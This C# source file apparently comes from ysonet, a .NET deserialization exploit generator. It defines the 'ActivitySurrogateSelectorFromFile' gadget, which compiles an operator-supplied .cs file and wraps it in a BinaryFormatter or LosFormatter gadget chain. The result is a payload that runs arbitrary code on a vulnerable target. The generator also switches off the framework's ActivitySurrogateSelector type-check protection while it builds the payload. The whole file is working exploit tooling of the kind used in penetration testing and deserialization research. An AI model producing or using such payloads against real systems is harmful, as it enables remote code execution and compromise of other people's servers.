using NDesk.Options;
using System;
using System.Runtime.Serialization;
using ysonet.Helpers;

namespace ysonet.Generators
{
    [Serializable]
    public class PayloadClassFromFile : PayloadClass
    {
        protected PayloadClassFromFile(SerializationInfo info, StreamingContext context) : base(info, context)
        {
        }

        public PayloadClassFromFile(string file, int variant_number, InputArgs inputArgs)
        {
            this.variant_number = variant_number;
            this.inputArgs = inputArgs;
            // --legacyfx means "make this payload land on the CLR-v2 generation", and for this
            // gadget the assembly it CARRIES is the part that decides that: the identity rewrite
            // cannot reach inside compiled IL, so a 4.x-compiled class is refused by a CLR-2
            // target however the surrounding graph is named. Compiling the operator's source
            // with the v3.5 compiler is what makes the option mean the same thing here as it
            // does everywhere else.
            base.assemblyBytes = LocalCodeCompiler.GetAsmBytes(file,
                inputArgs != null && inputArgs.LegacyFx);
        }
    }

    public class ActivitySurrogateSelectorFromFileGenerator : ActivitySurrogateSelectorGenerator
    {
        private int variant_number = 1;

        public override string Name()
        {
            return "ActivitySurrogateSelectorFromFile";
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Payload variant number where applicable. Choices: 1 (default), 2 (shorter but may not work between versions), 3 (larger DataSet carrier)", v => int.TryParse(v, out this.variant_number) },
            }
            .WithMetadata("variant", OptionMetadata.ForVariants(Variants()));
            return options;
        }

        public override string AdditionalInfo()
        {
            return "Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as the path to the .cs file that should be compiled as an exploit class. Put a semicolon before its references and separate multiple references with commas, e.g., '-c MyClass.cs;UsedRef.dll,Ref2.dll'. For a .NET Framework 3.5 target, use --legacyfx with the default variant or variant 3. Variant 2 remains 4.x-only; variant 3 selects the larger DataSet carrier.";
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.CsSourceFile;
        }


        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Disable ActivitySurrogate type protections during generation
            System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");

            try
            {
                PayloadClassFromFile payload = new PayloadClassFromFile(inputArgs.Cmd, variant_number, inputArgs);

                if (inputArgs.Minify)
                {
                    // Same as ActivitySurrogateSelector: this branch minifies for itself, so it
                    // hands the result to the shared finisher with alreadyMinified rather than
                    // returning its own bytes. That is where the whole-payload generation
                    // boundary runs and where the self-test reads the FINAL bytes.
                    byte[] payloadInByte = payload.GadgetChainsToBinaryFormatter();
                    if (formatter.ToLower().Equals("binaryformatter"))
                    {
                        return FinishHandWrittenPayload(payloadInByte, formatter, inputArgs, null, true);
                    }
                    else if (formatter.ToLower().Equals("losformatter"))
                    {
                        payloadInByte = Helpers.ModifiedVulnerableBinaryFormatters.SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(payload.GadgetChainsToBinaryFormatter());
                        return FinishHandWrittenPayload(payloadInByte, formatter, inputArgs, null, true);
                    }
                }
                return Serialize(payload, formatter, inputArgs);
            }
            catch (System.IO.FileNotFoundException e1)
            {
                Console.WriteLine("Error in provided file(s): \r\n" + e1.Message);
                return "";
            }

        }
    }
}
